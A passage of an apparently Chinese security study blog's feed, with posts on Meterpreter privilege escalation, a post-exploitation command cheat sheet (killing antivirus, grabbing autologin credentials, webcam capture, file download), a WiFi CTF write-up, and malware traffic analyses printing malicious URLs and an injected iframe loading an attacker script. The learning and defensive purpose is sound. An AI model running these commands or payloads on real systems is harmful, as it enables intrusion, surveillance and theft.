    <content type="html"><![CDATA[<h1 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h1><span id="more"></span><p>纵向提权 <code>and</code> 横向提权<br><code>Windows</code>命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">whoami /groups</span><br></pre></td></tr></table></figure><p>当前组为<code>Mandatory Label\Medium Mandatory Level</code>，为标准用户<br><img src="/images/Post-exploitation-attack-privilege-escalation/image.png"><br>那么就需要升到管理员权限，也就是<code>Mandatory Lable\High  Mandatory Level</code></p><p><code>getuid</code>查看已经获得的权限</p><p><img src="/images/Post-exploitation-attack-privilege-escalation/image-1.png"></p><p>并尝试使用<code>getsystem</code>发现失败了</p><p><img src="/images/Post-exploitation-attack-privilege-escalation/image-2.png"></p><p>进入<code>shell</code>使用<code>systeminfo</code>看看打了哪些补丁</p><p><img src="/images/Post-exploitation-attack-privilege-escalation/image-3.png"></p><p>尽量使用最新的的<code>EXP</code>进行提权<br><img src="/images/Post-exploitation-attack-privilege-escalation/image-4.png"></p><p><code>show options</code></p><p><img src="/images/Post-exploitation-attack-privilege-escalation/image-5.png"></p><p><code>set session 1</code><br><img src="/images/Post-exploitation-attack-privilege-escalation/image-6.png"></p><p>貌似没成功</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Privilege-escalation&quot;&gt;&lt;a href=&quot;#Privilege-escalation&quot; class=&quot;headerlink&quot; title=&quot;Privilege escalation&quot;&gt;&lt;/a&gt;Privilege escalation&lt;/h1&gt;</summary>
    
    
    
    <category term="penetration_test" scheme="https://2in9ya2.github.io/categories/penetration-test/"/>
    
    
    <category term="study" scheme="https://2in9ya2.github.io/tags/study/"/>
    
    <category term="penetration test" scheme="https://2in9ya2.github.io/tags/penetration-test/"/>
    
  </entry>
  
  <entry>
    <title>Post-exploitation attack</title>
    <link href="https://2in9ya2.github.io/Post-exploitation-attack-information-gathering/"/>
    <id>https://2in9ya2.github.io/Post-exploitation-attack-information-gathering/</id>
    <published>2024-04-15T07:20:19.000Z</published>
    <updated>2025-08-13T05:11:30.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Information-gathering"><a href="#Information-gathering" class="headerlink" title="Information gathering"></a>Information gathering</h1><span id="more"></span><h2 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h2><p>在获得<code>Meterpreter Shell</code>后，如何进行下一步</p><p>使用命令<code>ps</code>查看正在运行的进程</p><p>使用<code>getpid</code>查看<code>Meterpreter Shell</code>的进程号</p><p>进程迁移：之后使用<code>migrate</code>命令将<code>Shell</code>移动到其他进程里面，或者使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/migrate </span><br></pre></td></tr></table></figure><p>系统自动寻找合适的进程进行迁移</p><h2 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h2><p><code>sysinfo</code>命令查看目标机的系统信息<br>使用<strong>命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure><p>来查看目标机是否运行再虚拟机上</p><p><strong>命令</strong><code>idletime</code>查看目标机最近运行时间</p><p><strong>命令</strong><code>route</code>查看路由信息</p><p><strong>命令</strong><code>getuid</code>查看当前目标机器上已经渗透成功的用户名</p><p><strong>命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/killav</span><br></pre></td></tr></table></figure><p>关闭目标机系统杀毒软件</p><p><strong>命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><p>启用目标机的远程桌面协议 <code>3389</code>端口</p><p><strong>命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/autoroute</span><br></pre></td></tr></table></figure><p>查看目标机本地子网情况</p><p>使用<code>background</code>将<code>Meterpreter</code>终端隐藏在后台，之后使用<code>route add</code>添加路由，可以使用<code>route print</code>查看</p><p><strong>命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_logged_on_users</span><br></pre></td></tr></table></figure><p>列举当前多少用户登陆了目标机</p><p><strong>命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_applications</span><br></pre></td></tr></table></figure><p>列举装在目标机上的应用</p><p><strong>命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run windows/gather/credentials/windows_autologin</span><br></pre></td></tr></table></figure><p>可以抓取自动登录的用户名和密码</p><p><strong>屏幕截图命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load espia</span><br><span class="line">screengrab</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot</span><br></pre></td></tr></table></figure><p><strong>命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_list</span><br></pre></td></tr></table></figure><p>查看有没有摄像头</p><p><strong>命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_snap</span><br></pre></td></tr></table></figure><p>拍摄</p><p><strong>命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_stream</span><br></pre></td></tr></table></figure><p>开启直播<br><strong>命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p>进入目标机<code>Shell</code></p><h2 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwd # 目标机目录</span><br><span class="line">get lwd # 查看当前处于本地哪个目录</span><br><span class="line">ls</span><br><span class="line">cd </span><br><span class="line">search -f *.txt -d c:\ # 查看C盘中所有以.txt为拓展名的文件</span><br><span class="line">download c:\xxx /root # 将特定文件下载</span><br><span class="line">upload /root c: # 将文件上传</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Information-gathering&quot;&gt;&lt;a href=&quot;#Information-gathering&quot; class=&quot;headerlink&quot; title=&quot;Information gathering&quot;&gt;&lt;/a&gt;Information gathering&lt;/h1&gt;</summary>
    
    
    
    <category term="penetration_test" scheme="https://2in9ya2.github.io/categories/penetration-test/"/>
    
    
    <category term="study" scheme="https://2in9ya2.github.io/tags/study/"/>
    
    <category term="penetration test" scheme="https://2in9ya2.github.io/tags/penetration-test/"/>
    
  </entry>
  
  <entry>
    <title>被加密的WIFI</title>
    <link href="https://2in9ya2.github.io/20240414-Traffic/"/>
    <id>https://2in9ya2.github.io/20240414-Traffic/</id>
    <published>2024-04-14T07:26:58.000Z</published>
    <updated>2025-08-13T05:11:30.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024-04-14-看雪CTF-Misc-被加密的WIFI"><a href="#2024-04-14-看雪CTF-Misc-被加密的WIFI" class="headerlink" title="2024-04-14 看雪CTF Misc 被加密的WIFI"></a>2024-04-14 看雪CTF Misc 被加密的WIFI</h1><span id="more"></span><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="WLAN服务介绍"><a href="#WLAN服务介绍" class="headerlink" title="WLAN服务介绍"></a>WLAN服务介绍</h3><p>WLAN（Wireless Local Area Network，无线局域网）服务是一种无线网络技术，用于在局域网范围内提供无线连接。它通过无线信号传输数据，使设备能够在范围内进行通信和共享资源，而无需使用传统的有线连接</p><h3 id="常用术语-1"><a href="#常用术语-1" class="headerlink" title="常用术语[1]"></a>常用术语[1]</h3><ul><li>客户端<br>带有无线网卡的PC或便携式笔记本电脑等终端</li><li>AP（Access Point，接入点）<br>AP提供无线客户端到局域网的桥接功能，在无线客户端与无线局域网之间进行无线到有线和有线到无线的帧转换</li><li>AC（Access Controller，无线控制器）<br>无线控制器对无线局域网中的所有AP进行控制和管理。无线控制器还可以通过同认证服务器交互信息，来为WLAN用户提供认证服务</li><li>FAT AP<br>一种控制和管理无线客户端的无线设备。帧在客户端和LAN之间传输需要经过无线到有线以及有线到无线的转换，而FAT AP在这个过程中起到了桥梁的作用</li><li>无线介质<br>无线介质是用于在无线用户间传输帧的介质。WLAN系统使用无线射频作为传输介质</li></ul><h3 id="交互过程-2"><a href="#交互过程-2" class="headerlink" title="交互过程[2]"></a>交互过程[2]</h3><p>  <img src="/images/20240414-Traffic/image.png"></p><h3 id="WLAN扫描方式"><a href="#WLAN扫描方式" class="headerlink" title="WLAN扫描方式"></a>WLAN扫描方式</h3><ul><li><p>被动扫描：</p><ul><li>被动扫描是指无线设备在接收模式下监听无线信道，记录周围所有发送信号的信息。</li><li>当设备处于被动扫描模式时，它只是收集附近无线网络的信息，而不发送任何请求。</li><li>被动扫描通常用于无线网络管理、监视和数据收集。</li></ul></li><li><p>主动扫描：</p><ul><li>主动扫描是指无线设备发送特殊的扫描请求信号，以搜索附近的无线网络。</li><li>在主动扫描中，设备会广播一个扫描请求，周围的无线接入点（AP）会收到请求并回复包含它们的SSID（服务集标识符）和其他信息的信标帧。</li><li>设备根据接收到的响应确定可用的无线网络，并显示给用户或自动连接到最适合的网络。</li></ul></li></ul><h3 id="AP"><a href="#AP" class="headerlink" title="AP"></a>AP</h3><p>AP（接入点）作为无线局域网（WLAN）的核心组件之一，每隔一段时间会执行多项任务以确保网络的稳定性、性能和安全性。首先，它会定期广播信标帧，通知附近设备网络的存在和基本信息，帮助设备找到并连接到该网络。同时，AP会监视连接状态和信道质量，定期检查连接设备的状态并维持连接的稳定性，以及监视所在信道的质量并根据需要调整通信参数。此外，AP会定期更新配置信息，从网络管理系统获取最新的设置和安全策略，并执行漫游决策以提供最佳的用户体验。最后，AP还会定期监视网络安全性，确保网络没有异常活动或潜在的安全威胁。综上所述，AP通过执行这些任务，有效地管理和维护 WLAN，以满足用户的需求并提供可靠的无线连接。</p><h3 id="广播流量"><a href="#广播流量" class="headerlink" title="广播流量"></a>广播流量</h3><p>利用命令<code>wlan.fc.type_subtype == 0x08</code>过滤出WLAN流量的广播包<br><img src="/images/20240414-Traffic/image-1.png"></p><h3 id="WLAN认证方式"><a href="#WLAN认证方式" class="headerlink" title="WLAN认证方式"></a>WLAN认证方式</h3><ol><li>开放系统认证（Open System Authentication）：这是最基本的认证方式，设备可以连接到网络而无需提供任何凭据。它提供了最低级别的安全性，因为任何设备都可以连接到网络。<br><img src="/images/20240414-Traffic/image-2.png"></li><li>共享密钥认证（Shared Key Authentication）：在这种认证方式中，接入点要求连接的设备提供与接入点预先共享的密钥进行认证。虽然这比开放系统认证提供了一定程度的安全性，但它已被证明是不安全的，并已不推荐使用。<br><img src="/images/20240414-Traffic/image-3.png"></li><li>WPA&#x2F;WPA2-PSK（Wi-Fi Protected Access Pre-Shared Key）：这是一种基于预共享密钥的个人级别的认证方式。用户在连接到网络之前需要输入预共享密钥（也称为密码）。WPA&#x2F;WPA2-PSK 提供了更强的安全性，因为通信过程中使用了加密的会话密钥。</li></ol><ul><li>WPA&#x2F;WPA2-PSK（Pre-Shared Key）：<ul><li>这是个人级别的认证方式，也称为WPA-PSK或WPA2-PSK。</li><li>用户需要在连接到网络之前输入预共享密钥（也称为密码）。</li><li>预共享密钥用于生成会话密钥，用于加密数据传输。</li><li>WPA2-PSK相比WPA-PSK提供了更强大的加密算法，如AES（Advanced Encryption Standard）。</li></ul></li></ul><ol start="4"><li>MAC地址过滤：在这种认证方式中，接入点根据设备的MAC地址来控制允许连接到网络的设备。只有在接入点允许的设备MAC地址列表中的设备才能连接到网络。<br><img src="/images/20240414-Traffic/image-4.png"><br>其他方式请自行查询</li></ol><h3 id="WLAN关联"><a href="#WLAN关联" class="headerlink" title="WLAN关联"></a>WLAN关联</h3><p>设备向选择的接入点发送关联请求，请求加入网络，接入点对请求进行身份验证和认证，并在成功后为设备分配IP地址。一旦确认响应收到，关联完成，设备便可以在无线网络中进行数据传输和通信。<br>当接入点（AP）收到关联请求（Association Request）时，首先会验证请求的有效性，包括身份验证信息和认证方式。接着，AP会检查请求中的休眠参数，如Listen Interval，以了解STA的休眠模式，并根据需要处理帧的存储和转发。如果AP有足够的资源来处理新的关联请求，它将为STA分配资源并暂存任何需要发送给STA的帧。然后，AP会发送关联响应（Association Response），如果成功处理了关联请求，它会指示STA可以成功连接到网络。然而，如果AP无法为STA分配足够的资源，它可能会返回一个失败的关联响应，指示连接失败。在处理关联请求时，AP需要平衡资源容量和网络性能，以确保为所有连接的STA提供足够的资源和服务。</p><h3 id="WLAN关联成果后四次握手"><a href="#WLAN关联成果后四次握手" class="headerlink" title="WLAN关联成果后四次握手"></a>WLAN关联成果后四次握手</h3><p><a href="https://kysonlok.gitbook.io/blog/wireless/4_way_handshake">WiFi 四次握手分析</a></p><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>通过查看<code>HTTP</code>流，发现其传输了密码，博主运气好，只看了一条流，就看到了密码<br><img src="/images/20240414-Traffic/image-5.png"></p><p>利用<code>airdecap.ng</code>工具对<code>pcap</code>包进行解密<br><img src="/images/20240414-Traffic/image-7.png"></p><p>之后对解密后的包进行分析，看看是不是藏在图片里，或者其他文件里，找了一圈发现没有<br><img src="/images/20240414-Traffic/image-8.png"></p><p>那就直接搜索<code>flag</code>，还真有<br><img src="/images/20240414-Traffic/image-9.png"><br><img src="/images/20240414-Traffic/image-10.png"></p><p>对<code>flag%7Buse_a_strong_pass%7D</code>进行解码得到<code>flag&#123;use_a_strong_pass&#125;</code><br><img src="/images/20240414-Traffic/image-11.png"><br>嘿嘿，对了，我还以为很复杂呢，下面这个是在搜索过程中发现的，大家也可以看一看<br><a href="https://blog.csdn.net/weixin_41603028/article/details/103812261">一道关于无线网络和隐写的CTF</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1]<a href="https://www.h3c.com/cn/d_200812/622875_473262_0.htm">https://www.h3c.com/cn/d_200812/622875_473262_0.htm</a><br>[2]<a href="https://community.nxp.com/t5/Wireless-Connectivity-Knowledge/802-11-Wi-Fi-Connection-Disconnection-process/ta-p/1121148">https://community.nxp.com/t5/Wireless-Connectivity-Knowledge/802-11-Wi-Fi-Connection-Disconnection-process/ta-p/1121148</a><br>[3]<a href="https://blog.csdn.net/random_run/article/details/115223124">https://blog.csdn.net/random_run/article/details/115223124</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2024-04-14-看雪CTF-Misc-被加密的WIFI&quot;&gt;&lt;a href=&quot;#2024-04-14-看雪CTF-Misc-被加密的WIFI&quot; class=&quot;headerlink&quot; title=&quot;2024-04-14 看雪CTF Misc 被加密的WIFI&quot;&gt;&lt;/a&gt;2024-04-14 看雪CTF Misc 被加密的WIFI&lt;/h1&gt;</summary>
    
    
    
    <category term="traffic_analysis" scheme="https://2in9ya2.github.io/categories/traffic-analysis/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="ctf" scheme="https://2in9ya2.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>TRAFFIC ANALYSIS EXERCISE - FRANK-N-TED (WHAT&#39;S GOING ON?)</title>
    <link href="https://2in9ya2.github.io/20200612-Malware/"/>
    <id>https://2in9ya2.github.io/20200612-Malware/</id>
    <published>2024-04-14T02:02:44.000Z</published>
    <updated>2025-08-13T05:11:30.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020-06-12-TRAFFIC-ANALYSIS-EXERCISE-FRANK-N-TED-WHAT’S-GOING-ON"><a href="#2020-06-12-TRAFFIC-ANALYSIS-EXERCISE-FRANK-N-TED-WHAT’S-GOING-ON" class="headerlink" title="2020-06-12 - TRAFFIC ANALYSIS EXERCISE - FRANK-N-TED (WHAT’S GOING ON?)"></a>2020-06-12 - TRAFFIC ANALYSIS EXERCISE - FRANK-N-TED (WHAT’S GOING ON?)</h1><span id="more"></span><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="HTTP流"><a href="#HTTP流" class="headerlink" title="HTTP流"></a>HTTP流</h3><p>首先查看<code>HTTP</code>流，然后追踪第一条流</p><p><img src="/images/20200612-Malware/2024-04-14-10-08-42-image.png"></p><p>提示<code>document</code>被转移，猜测用户访问<code>http://cardboardspaceshiptoys.com/logs/invoice-86495.doc</code>后，又点击<code>https://cardboardspaceshiptoys.com/logs/invoice-86495.doc</code></p><p><img src="/images/20200612-Malware/2024-04-14-10-09-18-image.png"></p><p>随后追踪后两条<code>HTTP</code>流</p><p><img src="/images/20200612-Malware/2024-04-14-10-11-14-image.png"></p><p>发现在<code>GET http://205.185.125.104/files/june11.dll</code>后，响应了一个可执行文件</p><p><img src="/images/20200612-Malware/2024-04-14-10-12-00-image.png"></p><p>随后对<code>http://snnmnkxdhflwgthqismb.com/post.php</code>进行了一系列<code>POST REQUEST</code></p><p><img src="/images/20200612-Malware/2024-04-14-10-15-07-image.png"></p><p>利用<code>virustotal</code>查询域名<code>snnmnkxdhflwgthqismb.com</code></p><p><img src="/images/20200612-Malware/2024-04-14-10-17-04-image.png"></p><p>在虚拟机中导出.dll文件，并计算其sha256值，并进行查询，其为恶意软件</p><p><img src="/images/20200612-Malware/2024-04-14-10-21-34-image.png"></p><h3 id="加密流"><a href="#加密流" class="headerlink" title="加密流"></a>加密流</h3><p>利用<code>tls.handshake.type eq 1</code>过滤条件查询握手信息，好像没什么信息<img src="/images/20200612-Malware/2024-04-14-10-26-34-image.png"></p><h3 id="线索梳理"><a href="#线索梳理" class="headerlink" title="线索梳理"></a>线索梳理</h3><ul><li>Environment（调查的资产信息&#x2F;环境）<ul><li>LAN segment range:10.6.12.0&#x2F;24 </li><li>Domain:frank-n-ted.com</li><li>Domain controller:frank-n-ted-dc-10.6.12.12</li><li>LAN segment gateway:10.6.12.1</li><li>LAN segment broadcast address:10.6.12.255</li></ul></li><li>Incident Report<ul><li><p>Executive summary:</p><p>LAPTOP-5WKHX9YG的用户frank.brokowski访问<a href="http://205.185.125.104/files/june11.dll%E8%A2%AB%E6%84%9F%E6%9F%93">http://205.185.125.104/files/june11.dll被感染</a></p></li><li><p>Victim details</p><ul><li>IP address:10.6.12.203</li><li>MAC address:Intel_6d:fc:e2 (84:3a:4b:6d:fc:e2)</li><li>User account name:frank.brokowsk</li></ul></li><li><p>Indicators of compromise (IOCs)</p><ul><li>SHA256 hash:d36366666b407fe5527b96696377ee7ba9b609c8ef4561fa76af218ddd764dec</li><li>File size:563,032 字节</li><li>File name:june11.dll</li><li>File location:<a href="http://205.185.125.104/files/june11.dll">http://205.185.125.104/files/june11.dll</a></li><li>File description:恶意程序</li></ul></li><li><p>HTTP traffic to retrieve the malware</p><p>3302    2020-06-13 01:15:19.658851    10.6.12.203    205.185.125.104    HTTP    205.185.125.104    GET &#x2F;files&#x2F;june11.dll HTTP&#x2F;1.1     http (80)    49739 (49739)        312        Intel_6d:fc:e2    Cisco_29:41:7d</p></li><li><p>HTTP traffic for remote request infection activity</p><p>4228    2020-06-13 01:17:09.848132    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49743 (49743)        713        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>4237    2020-06-13 01:17:10.374922    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49744 (49744)        749        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>4632    2020-06-13 01:17:12.291210    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49747 (49747)        646        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>4633    2020-06-13 01:17:12.291276    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49746 (49746)        584        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>4638    2020-06-13 01:17:12.291811    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49748 (49748)        579        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>4645    2020-06-13 01:17:12.293078    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49749 (49749)        705        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>4650    2020-06-13 01:17:12.296081    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49745 (49745)        649        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>4813    2020-06-13 01:17:13.261739    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49750 (49750)        638        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>5330    2020-06-13 01:17:13.575334    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49751 (49751)        585        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>5776    2020-06-13 01:17:14.014885    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49752 (49752)        668        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>8359    2020-06-13 01:17:15.790515    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49753 (49753)        816        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>8539    2020-06-13 01:17:17.284101    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49754 (49754)        890        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>8550    2020-06-13 01:17:18.846653    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49755 (49755)        798        Intel_6d:fc:e2    Cisco_29:41:7d</p><p>8562    2020-06-13 01:17:20.377579    10.6.12.203    5.101.51.151    HTTP    snnmnkxdhflwgthqismb.com    POST &#x2F;post.php HTTP&#x2F;1.1     http (80)    49756 (49756)        918        Intel_6d:fc:e2    Cisco_29:41:7d</p></li></ul></li></ul><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://traffic.y1ng.org/0x4_27-8-2020/">FRANK-N-TED (WHAT’S GOING ON?) - Traffic Analysis Train</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2020-06-12-TRAFFIC-ANALYSIS-EXERCISE-FRANK-N-TED-WHAT’S-GOING-ON&quot;&gt;&lt;a href=&quot;#2020-06-12-TRAFFIC-ANALYSIS-EXERCISE-FRANK-N-TED-WHAT’S-GOING-ON&quot; class=&quot;headerlink&quot; title=&quot;2020-06-12 - TRAFFIC ANALYSIS EXERCISE - FRANK-N-TED (WHAT’S GOING ON?)&quot;&gt;&lt;/a&gt;2020-06-12 - TRAFFIC ANALYSIS EXERCISE - FRANK-N-TED (WHAT’S GOING ON?)&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>DATA DUMP FROM ASTAROTH (GUILDMA) MALWARE INFECTION</title>
    <link href="https://2in9ya2.github.io/20240405-Malware/"/>
    <id>https://2in9ya2.github.io/20240405-Malware/</id>
    <published>2024-04-13T04:57:12.000Z</published>
    <updated>2025-08-13T05:11:30.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024-04-05-THURSDAY-DATA-DUMP-FROM-ASTAROTH-GUILDMA-MALWARE-INFECTION"><a href="#2024-04-05-THURSDAY-DATA-DUMP-FROM-ASTAROTH-GUILDMA-MALWARE-INFECTION" class="headerlink" title="2024-04-05 (THURSDAY): DATA DUMP FROM ASTAROTH (GUILDMA) MALWARE INFECTION"></a>2024-04-05 (THURSDAY): DATA DUMP FROM ASTAROTH (GUILDMA) MALWARE INFECTION</h1><span id="more"></span><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="HTTP流"><a href="#HTTP流" class="headerlink" title="HTTP流"></a>HTTP流</h3><p>首先查看<code>HTTP</code>流，并追踪第一条流</p><p><img src="/images/20240405-Malware/2024-04-13-13-19-32-image.png"></p><p>返回的<code>HTML</code>代码的作用是在当前页面中嵌入了一个 <code>iframe</code>元素，该 <code>iframe</code>加载了指定的 <code>URL</code>。该 <code>URL</code> 中的参数 <code>searchString</code> 包含了一些<code>JavaScript</code>代码，其中引入了 <code>jQuery</code>库，并加载了另一个<code>JavaScript</code> 文件</p><p><img src="/images/20240405-Malware/2024-04-13-13-21-02-image.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&quot;margin:0;padding:0;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;position:relative; top: -104px; left: -141px;width:10;height:10&quot;</span> <span class="attr">allowtransparency</span>=<span class="string">&quot;true&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://biosuperdeal.be/index.php?searchString=%3Cscript%20src=%22https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js%22%3E%3C/script%3E%3Cscript%20type=%22text/javascript%22%20src=%22http://eeiufr.neoburst.company/74262421815720Z1iFaTEnQ76IoEzkmhPMkFUzvGd2Vk4o2934293112/Imprimir_DACTEs_73262593.doa_..%22%3E&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>追踪第二条<code>HTTP</code>流，发现其响应了一个<code>JS</code>代码</p><p><img src="/images/20240405-Malware/2024-04-13-13-31-00-image.png"></p><p>这个<code>JS</code>代码的变量名和函数名看起来都是随机生成的</p><p><img src="/images/20240405-Malware/2024-04-13-13-39-16-image.png"></p><p>使用了<code>WScript.Shell</code>对象，这通常用于执行系统命令</p><p><img src="/images/20240405-Malware/2024-04-13-13-49-15-image.png"></p><p><code>KUGvzmueVhJnAlPYGL</code>函数用于生成一个值，根据值的不同<code>ykCZgNvJcLaKRUUaoTjd</code>被赋予不同的地址</p><p><img src="/images/20240405-Malware/2024-04-13-13-44-32-image.png"></p><p>后面似乎还运行了<code>CMD</code>命令，看起来似乎是恶意代码</p><p><img src="/images/20240405-Malware/2024-04-13-13-46-34-image.png"></p><p>将下面流的域名<code>e9h47j3aey4.findbusca.store</code>在上一条流中的地址中查找，发现存在。可能的情况是用户访问了<code>http://eeiufr.neoburst.company/74262421815720Z1iFaTEnQ76IoEzkmhPMkFUzvGd2Vk4o2934293112/Imprimir_DACTEs_73262593.do</code>然后<code>JS</code>代码执行，随后访问了<code>http://e9h47j3aey4.findbusca.store/?77226593077628733</code></p><p><img src="/images/20240405-Malware/2024-04-13-13-51-19-image.png"></p><p>追踪这条流，首先请求服务器返回<code>http://e9h47j3aey4.findbusca.store/?77226593077628733</code>的<code>HTTP</code>标头信息，发现其是<code>.zip</code>文件</p><p><img src="/images/20240405-Malware/2024-04-13-13-54-39-image.png"></p><p> 同样方法查看，发现其返回了几个<code>.zip</code>文件，分别为gltGlAzqRU.zip、CoAaOeqlDZ.zip、xIARkijOeZ.zip、AyxnzbzCdp.zip，下载后分析（<strong>注意：请勿在个人电脑上下载，请在虚拟机内分析</strong>）</p><p><img src="/images/20240405-Malware/2024-04-13-14-13-40-image.png"><br>第一个是一个可执行文件，通过查询其<code>sha256</code>值，发现其为恶意软件</p><p><img src="/images/20240405-Malware/2024-04-13-14-16-46-image.png"></p><p>后面这三个不知道是什么东西，剩下的就没什么思路了（有其他的想法请<a href="https://twitter.com/2in9ya2">twitter</a>）</p><p><strong>(以下未完成)</strong></p><h3 